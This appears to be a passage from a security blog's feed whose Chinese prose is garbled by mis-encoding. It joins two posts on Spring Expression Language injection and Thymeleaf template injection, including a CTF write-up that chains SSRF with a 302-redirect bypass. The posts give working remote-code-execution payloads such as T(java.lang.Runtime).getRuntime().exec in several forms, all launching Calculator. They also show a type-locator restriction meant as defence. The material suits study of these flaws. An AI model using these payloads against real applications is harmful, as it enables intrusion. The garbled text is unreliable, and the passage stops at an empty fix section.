<p>è¡¨è¾¾å¼è¯­è¨€ï¼ˆExpression Languageï¼Œç®€ç§°ELï¼‰æ˜¯ä¸€ç§ä¸“é—¨ç”¨äºåœ¨åº”ç”¨ç¨‹åºä¸­è®¿é—®æ•°æ®å’Œå‡½æ•°çš„è½»é‡çº§ç¼–ç¨‹è¯­è¨€ï¼Œé€šå¸¸ç”¨äºWebåº”ç”¨ç¨‹åºä¸­ã€‚å®ƒæœ€åˆæ˜¯ä¸ºäº†ç®€åŒ–åœ¨JavaServer Pages (JSP) ä¸­çš„é¡µé¢ç¼–ç è€Œè®¾è®¡çš„ï¼Œä½†å…¶ä½¿ç”¨å·²ç»æ‰©å±•åˆ°å…¶ä»–æŠ€æœ¯é¢†åŸŸã€‚</p>
<h1 id="ä»€ä¹ˆæ˜¯spel">ä»€ä¹ˆæ˜¯SpELï¼Ÿ</h1>
<p>SpEL(Spring Expression Language)æ˜¯Springæ¡†æ¶ä¸­çš„ä¸€ä¸ªå¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œå®ƒæ‰©å±•äº†æ ‡å‡†ELçš„æ¦‚å¿µã€‚SpELæ”¯æŒæ›´å¤æ‚çš„è¡¨è¾¾å¼å¦‚æ–¹æ³•è°ƒç”¨ã€å­—ç¬¦ä¸²æ¨¡æ¿è¡¨è¾¾å¼ã€æ•°ç»„åˆ›å»ºã€åˆ—è¡¨é€‰æ‹©ã€æ˜ å°„è®¿é—®ç­‰ã€‚</p>
<p>SpELä¸ä¼ ç»Ÿçš„ELç›¸æ¯”ï¼Œæä¾›äº†æ›´åŠ ä¸°å¯Œçš„åŠŸèƒ½é›†ï¼Œå¯ä»¥åœ¨æ›´å¹¿æ³›çš„Springé¡¹ç›®ä¸­ä½¿ç”¨ï¼Œå¦‚å®‰å…¨æ€§è¡¨è¾¾å¼ã€æ•°æ®ç»‘å®šã€æ¡ä»¶è¡¨è¾¾å¼ç­‰ã€‚SpELä¸ä»…ä»…é™äºWebç¯å¢ƒï¼Œä¹Ÿå¯ç”¨äºä»»ä½•éœ€è¦åŠ¨æ€è¡¨è¾¾å¼è®¡ç®—çš„Springåº”ç”¨ç¨‹åºä¸­ã€‚</p>
<h1 id="spelç”¨æ³•ç¤ºä¾‹">SpELç”¨æ³•ç¤ºä¾‹</h1>
<p>ä½¿ç”¨ç¤ºä¾‹å‚è€ƒæ–‡æ¡£ï¼š<a href="https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html">https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html</a></p>
<p>SpELæ”¯æŒä»¥ä¸‹åŠŸèƒ½ï¼š</p>
<ul>
<li>å­—é¢è¡¨è¾¾å¼</li>
<li>å¸ƒå°”å’Œå…³ç³»è¿ç®—ç¬¦</li>
<li>æ­£åˆ™è¡¨è¾¾å¼</li>
<li>ç±»è¡¨è¾¾å¼</li>
<li>è®¿é—®å±æ€§ã€æ•°ç»„ã€åˆ—è¡¨å’Œæ˜ å°„</li>
<li>æ–¹æ³•è°ƒç”¨</li>
<li>å…³ç³»è¿ç®—ç¬¦</li>
<li>è°ƒç”¨æ„é€ å‡½æ•°</li>
<li>beanå¼•ç”¨</li>
<li>æ•°ç»„æ„é€ </li>
<li>å†…è”çš„list</li>
<li>å†…è”çš„map</li>
<li>ä¸‰å…ƒè¿ç®—ç¬¦</li>
<li>å˜é‡</li>
<li>ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°</li>
<li>é›†åˆé€‰æ‹©</li>
<li>æ¨¡æ¿åŒ–è¡¨è¾¾å¼</li>
</ul>
<p>è§£æå­—ç¬¦ä¸²</p>
<pre><code class="language-java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;'Hello World'&quot;);
String message = (String) exp.getValue();
</code></pre>
<p>è°ƒç”¨æ–¹æ³•</p>
<pre><code class="language-java">Expression exp = parser.parseExpression(&quot;'Hello World'.concat('!')&quot;);
String message = (String) exp.getValue();
</code></pre>
<p>è®¿é—®å±æ€§</p>
<pre><code class="language-java">Expression exp = parser.parseExpression(&quot;'Hello World'.bytes&quot;);
byte[] bytes = (byte[]) exp.getValue();
</code></pre>
<p>ä½¿ç”¨æ„é€ å‡½æ•°</p>
<pre><code class="language-java">Expression exp = parser.parseExpression(&quot;new String('hello world').toUpperCase()&quot;);
String message = exp.getValue(String.class);
</code></pre>
<p>é’ˆå¯¹ä¸€ä¸ªç‰¹å®šçš„å¯¹è±¡å®ä¾‹ï¼ˆç§°ä¸ºroot objectï¼‰æä¾›è¢«è§£æçš„è¡¨è¾¾å¼å­—ç¬¦ä¸²</p>
<pre><code class="language-java">User user = new User(&quot;skky&quot;, &quot;123456&quot;);
Expression objExp = parser.parseExpression(&quot;name&quot;);

EvaluationContext context = new StandardEvaluationContext(user);
String name = (String) objExp.getValue(context);
</code></pre>
<p><code>T</code>æ“ä½œç¬¦ç”¨äºè®¿é—®æŒ‡å®šçš„ç±»åŠå…¶é™æ€æ–¹æ³•å’Œé™æ€å±æ€§ï¼Œç”¨æ¥è·å–<strong>java.lang.Runtime</strong>ä¸‹çš„<code>getRuntime()</code>ä¹Ÿæ˜¯SpELæ³¨å…¥ä¸»è¦çš„åˆ©ç”¨æ–¹å¼</p>
<pre><code class="language-java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')&quot;);
String message = (String) exp.getValue();
</code></pre>
<p>å…³äº<code>T</code>æ“ä½œç¬¦æ–‡æ¡£ä¸­æœ‰ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„å†…å®¹</p>
<blockquote>
<p>The StandardEvaluationContext uses a TypeLocator to find types and the StandardTypeLocator (which can be replaced) is built with an understanding of the java.lang package. This means T() references to types within java.lang do not need to be fully qualified, but all other type references must be.</p>
</blockquote>
<p>è¿™é‡Œæåˆ°çš„<code>TypeLocator</code>å’Œ<code>StandardTypeLocator</code>ï¼š</p>
<ul>
<li><code>TypeLocator</code>ï¼šè¿™æ˜¯ä¸€ä¸ªæ¥å£ï¼ŒSpELä½¿ç”¨å®ƒæ¥æŸ¥æ‰¾ç±»å‹ã€‚<code>StandardEvaluationContext</code>ä½¿ç”¨è¿™ä¸ªæ¥å£çš„å®ç°æ¥ç¡®å®šå¦‚ä½•æ‰¾åˆ°è¡¨è¾¾å¼ä¸­å¼•ç”¨çš„ç±»å‹ã€‚</li>
<li><code>StandardTypeLocator</code>ï¼šè¿™æ˜¯<code>TypeLocator</code>çš„ä¸€ä¸ªæ ‡å‡†å®ç°ï¼Œé»˜è®¤æƒ…å†µä¸‹å®ƒäº†è§£<code>java.lang</code>åŒ…ã€‚å› æ­¤ï¼Œå¯¹äº<code>java.lang</code>åŒ…ä¸­çš„ç±»ï¼Œä½ ä¸éœ€è¦æä¾›å®Œæ•´çš„åŒ…åã€‚ä¾‹å¦‚ï¼Œ<code>T(String)</code>å·²ç»è¶³å¤Ÿå¼•ç”¨<code>java.lang.String</code>ç±»ã€‚ä½†æ˜¯å¯¹äºéj<code>ava.lang</code>åŒ…ä¸­çš„å…¶ä»–ç±»ï¼Œä½ å¿…é¡»ä½¿ç”¨å®Œæ•´çš„ç±»åï¼Œå¦‚<code>T(com.example.MyClass)</code>ã€‚</li>
</ul>
<p>å‚è€ƒçš„ä½¿ç”¨æ–¹å¼æ˜¯ç”¨æ¥æ–¹ä¾¿åœ°è§£æå’Œå¼•ç”¨ç±»ã€‚æ¯”å¦‚æœ‰ä¸‹é¢è¿™ä¸ªç±»</p>
<pre><code class="language-java">package com.examples;

public class Utility {
    public static String getGreeting() {
        return &quot;Hello, World!&quot;;
    }
}
</code></pre>
<p>ä½¿ç”¨<code>StandardTypeLocator</code>æ¥ç®€åŒ–æŸ¥æ‰¾</p>
<pre><code class="language-java">StandardEvaluationContext context_example = new StandardEvaluationContext();

// ä½¿ç”¨StandardTypeLocatorå¹¶æ·»åŠ ä¸€ä¸ªæ–°çš„åŒ…å‰ç¼€
StandardTypeLocator typeLocator = new StandardTypeLocator();
typeLocator.registerImport(&quot;com.examples&quot;);

context_example.setTypeLocator(typeLocator);

// ç°åœ¨å¯ä»¥ä¸ä½¿ç”¨å…¨è·¯å¾„æ¥è°ƒç”¨getGreeting()æ–¹æ³•
String greeting = parser.parseExpression(&quot;T(Utility).getGreeting()&quot;).getValue(context_example, String.class);
</code></pre>
<p>é‚£ä¹ˆè¿™ä¸ª<code>StandardTypeLocator</code>å¯ä¸å¯ä»¥ç”¨æ¥é™åˆ¶ä¸€äº›ç±»çš„æŸ¥æ‰¾å‘¢ï¼Ÿ</p>
<p>ç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç»§æ‰¿<code>StandardTypeLocator</code>ç„¶åé‡å†™å®ƒçš„<code>findType</code>æ–¹æ³•æ¥å¢åŠ æŸ¥æ‰¾ç±»çš„é™åˆ¶</p>
<pre><code class="language-java">import org.springframework.expression.EvaluationException;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.expression.spel.support.StandardTypeLocator;


public class exploit {
    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setTypeLocator(new RestrictedTypeLocator());

        Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')&quot;);
        String message = (String) exp.getValue(context);
    }
}


class RestrictedTypeLocator extends StandardTypeLocator {
    public RestrictedTypeLocator() {
        super();
    }

    @Override
    public Class&lt;?&gt; findType(String typeName) throws EvaluationException {
        if (typeName.startsWith(&quot;java.lang.Runtime&quot;)) {
            throw new EvaluationException(&quot;Access denied for type: &quot; + typeName);
        } else {
            return super.findType(typeName);
        }
    }
}
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/spel_re/1714828150238-d60d5fc8-1634-4843-b911-73bc62960c95.png" alt="image.png" loading="lazy"></figure>
<p>å¦å¤–å…³äº<code>StandardEvaluationContext</code>è¿˜æœ‰ä¸€ä¸ªè®¾ç½®è§£æå‰åç¼€çš„ç”¨æ³•ï¼Œå…·ä½“å‚è€ƒPç¥çš„javaconï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ã€‚</p>
<h1 id="thymeleafä¸spel">Thymeleafä¸SpEL</h1>
<p>Thymeleaf æ˜¯ä¸€ä¸ªJava æ¨¡æ¿å¼•æ“ï¼Œå®ƒä½¿ç”¨çš„æ¨¡ç‰ˆè¯­æ³•æ˜¯å…¶è‡ªå·±å®ç°çš„ï¼Œå«_Standard_ã€‚å®ƒçš„è¯­æ³•æ ¼å¼æœ‰ä¸‹é¢å‡ ç§</p>
<ul>
<li><code>${...}</code>: Variable expressions.</li>
<li><code>*{...}</code>: Selection expressions.</li>
<li><code>#{...}</code>: Message (i18n) expressions.</li>
<li><code>@{...}</code>: Link (URL) expressions.</li>
<li><code>~{...}</code>: Fragment expressions.</li>
<li><code>__...__</code>:  Expression preprocessing.</li>
</ul>
<p>é™¤äº†å­¦ä¹ æ¨¡ç‰ˆæ³¨å…¥çš„åä¸¤ç§ï¼ˆFragment expressions, Expression preprocessingï¼‰ï¼Œå‰ä¸¤ç§(Variable expressions, Selection expressions)ä¹Ÿæ˜¯å€¼å¾—æ³¨æ„çš„</p>
<blockquote>
<p>Variable expressions are OGNL expressions â€“or Spring EL if youâ€™re integrating Thymeleaf with Springâ€“ executed on the <em>context variables</em> â€” also called <em>model attributes</em> in Spring jargon.</p>
<p>Selection expressions are just like variable expressions, except they will be executed on a previously selected object instead of the whole context variables map.</p>
</blockquote>
<p>è¿™é‡Œé¢çš„å†…å®¹Thymeleafä¼šæ ¹æ®å½“å‰çš„ç¯å¢ƒï¼Œå°†å…¶å½“ä½œSpring ELæˆ–OGNLæ¥è§£æã€‚</p>
<p>æ‰€ä»¥å‰é¢çœ‹çš„Thymeleafæ¨¡ç‰ˆæ³¨å…¥ï¼Œå…¶å®å°±æ˜¯ç”¨åœ¨è§£ææ¨¡ç‰ˆåç§°çš„æ—¶å€™ï¼Œåœ¨æ¨¡æ¿åç§°ä¸­æ³¨å…¥äº†ä¸€ä¸ªé¢„å¤„ç†è¡¨è¾¾å¼ï¼Œè¿™ä¸ªé¢„å¤„ç†è¡¨è¾¾å¼åŒ…è£¹çš„æ˜¯ä¸€ä¸ªå˜é‡è¡¨è¾¾å¼ï¼Œè¿™ä¸ªå˜é‡è¡¨è¾¾å¼å°±å¯ä»¥ç”¨æ¥æ‰§è¡Œä»»æ„çš„SpELè¡¨è¾¾å¼ã€‚</p>
<p>å¦å¤–ä¹‹å‰çœ‹åˆ°çš„åœ¨ä¸‹é¢è¿™ç§å¯ä»¥å®Œå…¨æ§åˆ¶è§£æçš„æ¨¡ç‰ˆåç§°çš„æƒ…æ™¯</p>
<pre><code class="language-java">@GetMapping(&quot;/path&quot;)
public String path(@RequestParam String lang) {
    return lang; // template path is tainted
}
</code></pre>
<p>è¿™é‡Œä¸èµ°è§£æé¢„å¤„ç†è¡¨è¾¾å¼ï¼ˆä¸ä½¿ç”¨<code>_</code>çš„æƒ…å†µï¼‰ä¹Ÿæ˜¯å¯ä»¥çš„</p>
<pre><code>${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}::x
</code></pre>
<p>ä½¿ç”¨<code>::</code>è¿›å…¥ç‰‡æ®µè¡¨è¾¾å¼çš„è§£æé€»è¾‘ï¼Œç”±äºæ²¡æœ‰é¢„å¤„ç†è¡¨è¾¾å¼ï¼Œä¼ å…¥çš„æ¨¡ç‰ˆåç§°è¢«<code>~{...}</code>åŒ…è£¹åç›´æ¥ä½œä¸ºç‰‡æ®µè¡¨è¾¾å¼è§£æè¿”å›<br>
<img src="https://skyblu3519.github.io/post-images/spel_re/1714831173471-bf69b695-c458-46d8-a5cd-dcbc4e9f6166.png" alt="image.png" loading="lazy"></p>
<p>æ„é€ çš„å˜é‡è¡¨è¾¾å¼è¢«è§£ææˆäº†<code>templateName</code>ï¼Œæ¥ç€åœ¨åé¢çš„<code>FragmentExpression.createExecutedFragmentExpression(context, fragmentExpression);</code>å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°å…¶ä½œä¸ºå˜é‡è¡¨è¾¾å¼è¢«è§£æçš„ä»£ç <br>
<img src="https://skyblu3519.github.io/post-images/spel_re/1714831375949-fd272a78-da73-41bb-88b6-fd5a51f804b3.png" alt="image.png" loading="lazy"></p>
<h1 id="2024çº¢æ˜è°·simp1escape">2024çº¢æ˜è°·ï½œSimp1escape</h1>
<p><code>/curl</code>è·¯ç”±å­˜åœ¨SSRFï¼Œå¯ä»¥ä½¿ç”¨302è·³è½¬ç»•è¿‡ã€‚è¿™é‡Œè®°ä¸€ä¸‹å®ƒçš„å¤„ç†é€»è¾‘ï¼Œä¸‹æ¬¡çœ‹åˆ°å°±å¯ä»¥ç”¨äº†</p>
<pre><code class="language-java">InetAddress inetAddress = InetAddress.getByName(hostname);
if (Utils.isPrivateIp(inetAddress)) {
    return &quot;Illegal ip address&quot;;
} else {
    try {
        // ......
        TimeUnit.SECONDS.sleep(4L);
        HttpURLConnection connection = (HttpURLConnection)urlObject.openConnection();
        if (connection instanceof HttpURLConnection) {
            connection.connec
            // ......
</code></pre>
<p>ç”¨è¿™ä¸ªSSRFæ”»å‡»<code>/getsites</code></p>
<pre><code class="language-java">@GetMapping({&quot;/getsites&quot;})
public String admin(@RequestParam String hostname, HttpServletRequest request, HttpServletResponse response) throws Exception {
    String ipAddress = request.getRemoteAddr();
    if (!ipAddress.equals(&quot;127.0.0.1&quot;)) {
        response.setStatus(HttpStatus.FORBIDDEN.value());
        return &quot;forbidden&quot;;
    } else {
        Context context = new Context();
        TemplateEngine engine = new SpringTemplateEngine();
        String dispaly = engine.process(hostname, context);
        return dispaly;
    }
}
</code></pre>
<p><code>SpringTemplateEngine.process</code>æ˜¯ç”¨çš„çˆ¶ç±»<code>org.thymeleaf.TemplateEngine</code>å®ç°çš„ï¼Œæ ¹æ®<a href="https://www.thymeleaf.org/apidocs/thymeleaf/3.0.0.BETA02/org/thymeleaf/TemplateEngine.html#process-java.lang.String-org.thymeleaf.context.IContext-">APIæ–‡æ¡£</a>çš„æè¿°ï¼Œ<code>process</code>å°±æ˜¯å°†ä¼ å…¥templateå½“ä½œæ¨¡ç‰ˆå†…å®¹æ¥å¤„ç†çš„<br>
<img src="https://skyblu3519.github.io/post-images/spel_re/1714834031770-cde5607a-be13-4ed7-873c-d460ad53d9a8.png" alt="image.png" loading="lazy"></p>
<p>æ‰€ä»¥æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯ä¼ å…¥ä¸€ä¸ªåŒ…å«å˜é‡è¡¨è¾¾å¼çš„æ¨¡ç‰ˆï¼Œç„¶åç”¨å˜é‡è¡¨è¾¾å¼æ‰§è¡Œä»»æ„çš„SpELè¡¨è¾¾å¼ã€‚æ¯”å¦‚ï¼š</p>
<pre><code>&lt;td th:text=&quot;${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}&quot;&gt;&lt;/td&gt;
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/spel_re/1714834318634-c857d19f-7639-467d-90bc-ab0261151565.png" alt="image.png" loading="lazy"></figure>
<p>å¦å¤–ï¼Œä¹‹å‰çœ‹åˆ°çš„<code>[[...]]</code>è¿™ç§å†™æ³•å…¶å®æ˜¯ä¸€ç§å†…è”è¡¨è¾¾å¼çš„å†™æ³•ï¼Œå‚ç…§<a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#inlining">å®˜æ–¹æ–‡æ¡£</a>ç»™çš„ä¾‹å­ï¼Œåº”è¯¥å°±æ˜¯è®©å…¶åœ¨ä»»ä½•æ–‡æœ¬æ ‡ç­¾ä¸­æ‰§è¡ŒThymeleafçš„Standard Expressionã€‚</p>
<p>æ‰€ä»¥è¿™ä¸ªpayloadä¹Ÿå¯ä»¥å†™æˆ</p>
<pre><code>[[${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}]]
</code></pre>
<p>å¦å¤–åœ¨é¢˜ç›®çš„thymeleaf3.0.15ç‰ˆæœ¬ä¸­ï¼Œåœ¨å¯¹è¿”å›çš„æ¨¡ç‰ˆåç§°<code>viewTemplateName</code>æ–°å¢äº†æ£€æŸ¥<br>
<img src="https://skyblu3519.github.io/post-images/spel_re/1714835193225-cec8fb6a-f33a-49fa-8772-8f1637353cc3.png" alt="image.png" loading="lazy"></p>
<p>è¿™ä¸ª <code>checkViewNameNotInRequest</code> å‡½æ•°æ˜¯ä¸ºäº†ç¡®ä¿åœ¨å¤„ç†è§†å›¾åå­—æ—¶ï¼Œé¿å…è§†å›¾åç§°ä¸­åŒ…å«çš„è¡¨è¾¾å¼è¢«æ¶æ„åˆ©ç”¨ï¼Œæ‰€ä»¥ç›´æ¥ä¼ å…¥<code>${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}::x</code>æ˜¯æ— æ³•è¢«åˆ©ç”¨çš„ã€‚</p>
<p>å¦å¤–ï¼Œåœ¨é¢„å¤„ç†çš„éƒ¨åˆ†ä¹Ÿæ–°å¢å¯¹æ¶æ„åˆ©ç”¨çš„æ£€æŸ¥ï¼Œè¿™éƒ¨åˆ†çš„ç»•è¿‡å…·ä½“å‚è€ƒ<a href="https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/#RCE">https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/#RCE</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[SpELè¡¨è¾¾å¼æ³¨å…¥åˆè§]]></title>
        <id>https://skyblu3519.github.io/post/spel-biao-da-shi-zhu-ru-chu-jian/</id>
        <link href="https://skyblu3519.github.io/post/spel-biao-da-shi-zhu-ru-chu-jian/">
        </link>
        <updated>2024-04-21T19:09:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="èƒŒæ™¯çŸ¥è¯†">èƒŒæ™¯çŸ¥è¯†</h1>
<p>SpELæ³¨å…¥æ¼æ´æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œä¸»è¦å‘ç”Ÿåœ¨ä½¿ç”¨Springæ¡†æ¶çš„åº”ç”¨ä¸­ã€‚Spring Expression Languageï¼ˆSpELï¼‰æ˜¯ä¸€ä¸ªå¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œç”¨äºåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ã€‚è™½ç„¶SpELæä¾›äº†å¾ˆå¤šä¾¿åˆ©ï¼Œä½†å¦‚æœä¸æ­£ç¡®åœ°å¤„ç†ç”¨æˆ·è¾“å…¥ï¼Œå°±å¯èƒ½å¯¼è‡´æ³¨å…¥æ”»å‡»ã€‚</p>
<p>æµ‹è¯•ä»£ç ï¼š</p>
<pre><code class="language-java">import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

public class MainApp {
    public static void main(String[] args) {
        String exp = &quot;new java.lang.ProcessBuilder(new String[]{\&quot;open\&quot;,\&quot;/System/Applications/Calculator.app\&quot;}).start()&quot;;

        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(exp);
        StandardEvaluationContext context = new StandardEvaluationContext();
        System.out.println(expression.getValue(context));

    }
}
</code></pre>
<h1 id="spelæ¼æ´å¤ç°">SpELæ¼æ´å¤ç°</h1>
<h2 id="ä½ç‰ˆæœ¬springbootä¸­illegalstateexception">ä½ç‰ˆæœ¬SpringBootä¸­IllegalStateException</h2>
<p>å½±å“çš„ç‰ˆæœ¬æœ‰</p>
<ul>
<li>1.1.0-1.1.12</li>
<li>1.2.0-1.2.7</li>
<li>1.3.0</li>
</ul>
<p>pom.xml</p>
<pre><code class="language-xml">&lt;parent&gt;
  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
  &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
  &lt;version&gt;1.2.0.RELEASE&lt;/version&gt;
&lt;/parent&gt;
</code></pre>
<p>æµ‹è¯•ä»£ç </p>
<pre><code class="language-java">package com.example.mywebapp;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class exploit {
    @RequestMapping(&quot;/&quot;)
    public String index(String payload){
        throw new IllegalStateException(payload);
    }
}

</code></pre>
<p>è®¿é—®æ˜¯ä¸€ä¸ªé”™è¯¯é¡µé¢ï¼Œå½“è¾“å…¥çš„æ˜¯ä¸€ä¸ªSpELè¡¨è¾¾å¼çš„æ˜¯åå¯ä»¥çœ‹åˆ°è¢«è§£æ<br>
<img src="https://skyblu3519.github.io/post-images/SpEL/1713623131522-2c5170bc-9fec-4090-9c7e-976424ef22b5.png" alt="image.png" loading="lazy"></p>
<p>æ¼æ´åˆ†æä»<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code>å¼€å§‹ï¼Œæ‰¾åˆ°æœ€åå¤„ç†çš„<code>processDispatchResult</code>å‡½æ•°ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/SpEL/1713633352226-0ec621b1-2335-4f45-ac34-77b9f333c72d.png" alt="image.png" loading="lazy"></p>
<p>ä¹‹å‰å­¦Thymeleafçš„æ—¶å€™å¯¹Spring Bootå¤„ç†è¯·æ±‚çš„æµç¨‹å·²ç»æœ‰ä¸ªå¤§æ¦‚çš„äº†è§£äº†ï¼Œè¿™é‡Œ<code>IllegalStateException</code>æœ€åä¼šç”¨ä¸€ä¸ª<strong>error View</strong>å¯¹è±¡æ¥æ¸²æŸ“è¿”å›çš„é¡µé¢ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/SpEL/1713633572769-7866d6f6-49a9-4b5c-b5aa-baaeac4d8c18.png" alt="image.png" loading="lazy"></p>
<p>å®ƒçš„<code>render</code>æ–¹æ³•ä¼šå°†æ¸²æŸ“æ‰€éœ€çš„æ•°æ®å¯¹è±¡ï¼ˆ<strong>model</strong>ï¼‰è®¾ç½®ä¸ºæ¸²æŸ“ä¸Šä¸‹æ–‡çš„æ ¹å¯¹è±¡ï¼Œç„¶åä½¿ç”¨ä¸€ä¸ªåŠ©æ‰‹ç±» <strong>helper</strong> æ¥å¤„ç†æ¸²æŸ“çš„æ¨¡ç‰ˆï¼Œä¹Ÿå°±æ˜¯ä¸Šå›¾ä¸­<strong>template</strong>çš„å†…å®¹<br>
<img src="https://skyblu3519.github.io/post-images/SpEL/1713633832819-0d02fb9b-943c-4906-b3de-62b7453ffed8.png" alt="image.png" loading="lazy"></p>
<p><code>org.springframework.util.PropertyPlaceholderHelper#parseStringValue</code>æ˜¯æœ€åç”¨æ¥æ¸²æŸ“<strong>template</strong>çš„å‡½æ•°ã€‚</p>
<ul>
<li>å¤„ç†çš„å­—ç¬¦ä¸²<code>strVal</code>å­˜åœ¨<code>${</code>åˆ™å¯¹å…¶è¿›è¡Œè§£æ</li>
<li>å¯¹å¾…è§£æçš„<code>placeholder</code>é€’å½’è°ƒç”¨ä¸€æ¬¡<code>parseStringValue</code>ï¼ˆæœ‰ç‚¹æ¨¡ç‰ˆæ³¨å…¥çš„å‘³é“äº†ï¼‰</li>
<li>è¿”å›çš„<code>placeholder</code>ä¼šäº¤ç»™<code>placeholderResolver.resolvePlaceholder</code>ä»<strong>model</strong>ä¸­å–å€¼å¾—åˆ°<code>propVal</code></li>
<li>å¯¹<code>propVal</code>å†é€’å½’è°ƒç”¨<code>parseStringValue</code>å¤„ç†</li>
</ul>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/SpEL/1713634117230-474bfa4b-abec-4c66-a77a-0f4def3b2913.png" alt="image.png" loading="lazy"></figure>
<p>è€Œ<code>placeholderResolver.resolvePlaceholder</code>å¤„ç†æ–¹å¼å°±æ˜¯ä¸€ä¸ªSpELè¡¨è¾¾å¼çš„è§£æ<br>
<img src="https://skyblu3519.github.io/post-images/SpEL/1713634489337-1c3d9733-d890-4933-9d30-d54a32484ba2.png" alt="image.png" loading="lazy"></p>
<p>ï¼ˆPs.è¿™é‡Œè§£æçš„è¡¨è¾¾å¼ç›´æ¥æ˜¯ä¸€ä¸ªæ— ä»»ä½•åŒ…è£¹çš„å­—ç¬¦ä¸²ï¼ŒæŒ‰ç…§SpELçš„è§„åˆ™å®ƒåº”è¯¥è¢«ç†è§£ä¸ºä¸€ä¸ª<strong>BeanID</strong>ï¼Œä¸è¿‡è¿™é‡Œå´ç›´æ¥è¢«è§£æä¸º<strong>rootObject</strong>ä¸­<strong>HashMap</strong>é‡Œé¢çš„ä¸€ä¸ª<strong>value</strong>ï¼Œæœ‰ä¸€ç‚¹ç–‘æƒ‘<br>
<img src="https://skyblu3519.github.io/post-images/SpEL/1713634741196-00786bb7-0986-4548-a0b5-b73145066d54.png" alt="image.png" loading="lazy"></p>
<p>æ ¹æ®å®ƒçš„æµç¨‹æˆ‘æµ‹è¯•ä»£ç å¦‚ä¸‹</p>
<pre><code class="language-java">public static void main(String[] args) {
    ModelMap modelMap = new ModelMap();
    modelMap.addAttribute(&quot;sky&quot;, &quot;blue&quot;);
    ExpressionParser parser = new SpelExpressionParser();
    Expression expression = parser.parseExpression(&quot;sky&quot;);

    StandardEvaluationContext context = new StandardEvaluationContext();
    Map&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;(modelMap);
    context.setRootObject(map);

    System.out.println(expression.getValue(context));
}
</code></pre>
<p>æ²¡æœ‰ä»»ä½•æ‚¬å¿µçš„æŠ¥é”™äº†</p>
<p>ä»¥æˆ‘ç°åœ¨çš„èƒ½åŠ›å¥½åƒè¿˜æ²¡å‘æ¢ç©¶å…¶ä¸­çš„åŸå› ï¼Œæ•…åœ¨æ­¤è®°å½•<br>
ï¼‰</p>
<h3 id="æ¼æ´åˆ©ç”¨">æ¼æ´åˆ©ç”¨</h3>
<p>ç»è¿‡åˆ†æï¼Œå½“æ”»å‡»è€…å¯ä»¥æ§åˆ¶<code>propVal</code>çš„å†…å®¹å°†å…¶å˜ä¸ºä¸€ä¸ªæ¶æ„çš„SpELè¡¨è¾¾å¼æ—¶ï¼Œå°±å¯ä»¥åœ¨ä»£ç å¯¹<code>propVal</code>è§£æçš„æ—¶å€™è§¦å‘ã€‚æ ·ä¾‹ä¸­<code>IllegalStateException(payload)</code>å°†ä¼šè®¾ç½®<strong>message</strong>å­—æ®µä¸º<strong>payload</strong><br>
<img src="https://skyblu3519.github.io/post-images/SpEL/1713635254196-93693f3b-16d7-4d50-8ed9-467894e790e1.png" alt="image.png" loading="lazy"></p>
<p>å¦å¤–è¿˜éœ€æ³¨æ„çš„æ˜¯<code>placeholderResolver.resolvePlaceholder</code>è¿”å›æ—¶ä¼šå¯¹å­—ç¬¦ä¸²è¿›è¡Œhtmlå®ä½“ç¼–ç æ¥é˜²æ­¢XSS</p>
<h3 id="æ¼æ´ä¿®å¤">æ¼æ´ä¿®å¤</h3>
